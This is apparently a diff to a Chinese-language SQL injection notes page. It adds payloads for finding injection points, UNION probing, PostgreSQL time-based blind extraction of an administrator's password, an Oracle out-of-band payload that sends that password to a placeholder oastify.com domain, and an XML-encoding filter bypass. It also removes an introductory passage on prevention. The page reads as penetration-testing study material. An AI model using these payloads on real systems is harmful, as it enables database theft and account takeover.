@@ -13,31 +13,36 @@ outline: deep
 
 [Advanced SQL Injection](../webapp/InjectionAttacks.md#advanced-sql-injection)
 
-SQL注入漏洞主要形成的原因是在数据交互中，前端的数据传入到后台处理时，没有做严格的判断，导致其传入的“数据”拼接到SQL语句中后，被当作SQL语句的一部分执行。 从而导致数据库受损（被脱库、被删除、甚至整个服务器权限沦陷）。
-在构建代码时，一般会从如下几个方面的策略来防止SQL注入漏洞：
-
-1. 对传进SQL语句里面的变量进行过滤，不允许危险字符传入；
-2. 使用参数化（Parameterized Query 或 Parameterized Statement）；
-3. 还有就是,目前有很多ORM框架会自动使用参数化解决注入问题,但其也提供了"拼接"的方式,所以使用时需要慎重!
+[sql-injection-cheat-sheet](https://portswigger.net/web-security/sql-injection/cheat-sheet)
 
 ## common
 
-**注释**
-```sql
-#
-```
-`或者打空格`
-```sql
---+ 
-```
-<span style="font-size: 23px;">**payload**</span>
+**判断是否为注入点**
 
-`where id = '$id'`
 ```sql
-' or '1' = '1
+# step1 报错
+'
+# step2 200
+''
+' --+
+# 查询全部
+' or 1=1 --+
 ```
+
+**判断查询字段数目**
+
 ```sql
-' or 1=1 #
+' order by 3 --+
+```
+
+**确定回显字段**
+
+```sql
+' union select null,null,null --+ 
+```
+*oracle*
+```sql
+' union select null,null from dual --+ 
 ```
 
 **URL encoding**
@@ -53,55 +58,22 @@ SQL注入漏洞主要形成的原因是在数据交互中，前端的数据传�
 
 [ASCII](../linux/encoding.md#ascii)
 
-**判断是否为注入点**
-
-`where id = '$id'`
-```sql
-1' and '1'='1
-```
-```sql
-1' and 1=1 #
-```
-**判断查询字段数目**
-
-```sql
-1' order by 3 #
-1' order by 3 --+
-```
-
-**确定回显字段**
-
-```sql
-1' union select 1,2,3 limit 1,1 #
-```
-
-```sql
-' union select 1,2,3 #
-```
-```sql
-' union select null,null,null --+ 
-
-# oracle
-' union select null,null from dual --+ 
-```
 <span style="font-size: 19px;">**Querying the database type and version**</span>
 
-[sql-injection-cheat-sheet](https://portswigger.net/web-security/sql-injection/cheat-sheet)
-
-| Database type  |  Query |
-|----------------|--------|
-| Microsoft, MySQL  | `SELECT @@version` |
-|  Oracle |  `SELECT banner FROM v$version` |
-| PostgreSQL  | `SELECT version()`  |
+| Database type    | Query                          |
+| ---------------- | ------------------------------ |
+| Microsoft, MySQL | `SELECT @@version`             |
+| Oracle           | `SELECT banner FROM v$version` |
+| PostgreSQL       | `SELECT version()`             |
 
 <span style="font-size: 19px;">**不同数据库类型字符串串联语法**</span>
 
-| 数据库类型 | 字符串串联语法 (Concatenation Syntax) |
-| :--- | :--- |
-| **Oracle** | `username\|\| '-' \|\|password` |
-| **Microsoft (SQL Server)** | `username+ '-' +password` |
-| **PostgreSQL** | `username \|\| '-' \|\|password` |
-| **MySQL** | `CONCAT(username, '-', password)` |
+| 数据库类型                 | 字符串串联语法 (Concatenation Syntax) |
+| :------------------------- | :------------------------------------ |
+| **Oracle**                 | `username\|\| '-' \|\|password`       |
+| **Microsoft (SQL Server)** | `username+ '-' +password`             |
+| **PostgreSQL**             | `username \|\| '-' \|\|password`      |
+| **MySQL**                  | `CONCAT(username, '-', password)`     |
 
 ## union注入
 
@@ -113,7 +85,7 @@ SQL注入漏洞主要形成的原因是在数据交互中，前端的数据传�
 
 *查询当前操作数据库对应的信息*
 ```sql
-1' union select 1,user(),database(),version(),group_concat(table_name),6,7 from information_schema.tables where table_schema = database() #
+' union select 1,user(),database(),version(),group_concat(table_name),6,7 from information_schema.tables where table_schema = database() #
 ```
 *查询当前操作的数据库*
 ```sql
@@ -303,9 +275,12 @@ $result = mysqli_use_result($GLOBALS["___mysqli_ston"]);
 **payload**
 
 ```sql
-1'; update users set password='e10adc3949ba59abbe56e057f20f883e' where user_id=1; -- 
+'; update users set password='e10adc3949ba59abbe56e057f20f883e' where user_id=1; -- 
 ```
 
+```sql
+'%3b select pg_sleep(5) --+
+```
 ---
 
 ## In-Band
@@ -329,7 +304,7 @@ MySQL 的报错注入主要是利用 MySQL 的一些逻辑漏洞，如 BigInt �
 4. `exp()` 函数；
 5. `cast()`函数
 
-<span style="font-size: 19px;">**floor、rand(0)和group by**</span>
+<span style="font-size: 19px;">**1.floor、rand(0)和group by**</span>
 
 <img src="./assets/sqli_erro_based_rand_group.png" alt="background" width="533" >
 
@@ -337,7 +312,7 @@ MySQL 的报错注入主要是利用 MySQL 的一些逻辑漏洞，如 BigInt �
 select count(*),concat((select user()), floor(rand(0)*2)) x from information_schema.TABLES group by x
 ```
 
-<span style="font-size: 19px;">**extractvalue**</span>
+<span style="font-size: 19px;">**2.extractvalue**</span>
 
 ```sql
 select extractvalue(1, concat(0x7e, (select @@version)));
@@ -351,7 +326,7 @@ select extractvalue(1, concat(0x7e, (select @@version)));
 - **制造非法路径**：由于路径以波浪号 `~` 开头，不符合 **XPath** 的语法规范，数据库会因为**语法错误**而抛出异常。
 - **获取敏感信息**：数据库在报错时，会将这个不合法的路径（连同我们拼接进去的 `@@version` 版本信息）直接显示在错误信息中。例如：`1105 - XPATH syntax error: '~5.7.26'`
 
-<span style="font-size: 19px;">**updatxml**</span>
+<span style="font-size: 19px;">**3.updatxml**</span>
 
 ```sql
 select updatexml(1,concat(0x7e,(SELECT @@version)),1);
@@ -367,7 +342,7 @@ select updatexml(1,concat(0x7e,(SELECT @@version)),1);
   - `xpath_expression`：用于定位要修改的 **XML** 节点的 **XPath** 路径。
   - `new_xml`：替换后的新 **XML** 内容。
 
-<span style="font-size: 19px;">**exp()**</span>
+<span style="font-size: 19px;">**4.exp()**</span>
 
 ```sql
 select exp(~(select * from (select database())x));
@@ -406,7 +381,7 @@ XPATH syntax error: '~password'
 XPATH syntax error: '~5f4dcc3b5aa765d61d8327deb882'
 - `mid()` 函数：**字符串截取**，`MID(str, start, length)`
 
-<span style="font-size: 19px;">**cast()**</span>
+<span style="font-size: 19px;">**5.cast()**</span>
 
 ```bash
 ' AND 1=CAST((SELECT 1) AS int) --
@@ -462,8 +437,6 @@ xyz' AND (SELECT CASE WHEN (Username = 'Administrator' AND SUBSTRING(Password, 1
 '||(SELECT CASE WHEN SUBSTR(password,1,1)='a' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'
 ```
 
-
-
 ### Time-Based
 
 <span style="font-size: 19px;">**时间盲注常用函数**</span>
@@ -472,13 +445,30 @@ xyz' AND (SELECT CASE WHEN (Username = 'Administrator' AND SUBSTRING(Password, 1
 
 **PoC**
 
-```javascript
+```sql
 # guess length
-1' and length(database())>3 and sleep(2) -- '  
+' and length(database())>3 and sleep(2) -- '
 
 # guess character
-1' and substr(database(),1,1)='a' and sleep(2) -- '
-1' and ascii(substr(database(),1,1)) > 97 -- '
+' and substr(database(),1,1)='a' and sleep(2) -- '
+' and ascii(substr(database(),1,1)) > 97 and sleep(2) -- '
+```
+
+*postgresql*
+```sql
+# 判断是否有时间盲注
+'%3b pg_sleep(7) --+
+'%3b SELECT pg_sleep(7) --+ 
+'%3b SELECT CASE WHEN (1=1) THEN pg_sleep(7) ELSE pg_sleep(0) END --+
+
+# 查询表是否有相应数据
+'%3b SELECT CASE WHEN (username='administrator') THEN pg_sleep(7) ELSE pg_sleep(0) END from users--+
+
+# guess length
+'%3b SELECT CASE WHEN (LENGTH(password)>10) THEN pg_sleep(7) ELSE pg_sleep(0) END from users where username='administrator' --+
+
+# guess character
+'%3b SELECT CASE WHEN (substr(password,1,1)='a') THEN pg_sleep(7) ELSE pg_sleep(0) END from users where username='administrator' --+
 ```
 
 <span style="font-size: 19px;">**时间盲注 自动化代码**</span>
@@ -571,22 +561,6 @@ OOB 注入（Out-of-Band Injection，带外注入）可以让目标服务器自�
 
 `*.example.com` IP ： `www.example.com` 和 `abc.example.com` 都会访问到同一个站点。
 
-### tcpdump
-
-[tcpdump](../security/tcpdump.md)
-
-基于Unix系统的命令行的数据报嗅探工具，可以抓取流动在网卡上的数据包。
-
-**原理：**
-
-Linux抓包是通过注册一种虚拟的底层网络协议来完成对网络报文（准确的是网络设备）消息的处理权。
-
-系统在收到报文的时候就会给这个伪协议一次机会，让它对网卡收到的报文进行一次处理，此时该模块就会趁机对报文进行窥探。
-
-*监听DNS信息*
-```bash
-tcpdump–n port 53
-```
 
 ### 实施带外注入
 
@@ -636,6 +610,19 @@ select UTL_HTTP.request('http://192.168.25.166/test.php'||'?id='||(select versio
 ```
 在`192.168.25.166` 上的 test.php 会记录传递来的数据，并写入test.txt文件中。
 
+### PoC
+
+**Oracle**
+
+```bash
+# 确认可以触发OOB
+'union SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://xxx.oastify.com/"> %remote;]>'),'/l') FROM dual --+
+
+# 执行语句，获取数据
+' union SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://'||(SELECT password from users where username='administrator')||'.xxx.oastify.com/"> %remote;]>'),'/l') FROM dual --+
+```
+
+
 ---
 
 ## 混淆和绕过
@@ -643,6 +630,20 @@ select UTL_HTTP.request('http://192.168.25.166/test.php'||'?id='||(select versio
 [Filter Evasion Techniques](../webapp/InjectionAttacks.md#filter-evasion-techniques)
 
 普通的注入方式过于明显，很容易被检测。因此，需要改变攻击的手法，绕过检测和过滤，即**混淆和绕过**。具体操作针对于服务端和WAF的防御机制有多种手段。
+
+### XML encoding
+
+**PoC**
+
+```xml
+<?xml version="1.0" encoding="UTF-8"?>
+<stockCheck>
+    <productId>2</productId>
+    <storeId>
+        <@hex_entities>1 UNION SELECT username || '~' || password FROM users</@hex_entities>
+    </storeId>
+</stockCheck>
+```
 
 ### 不常用绕过
 
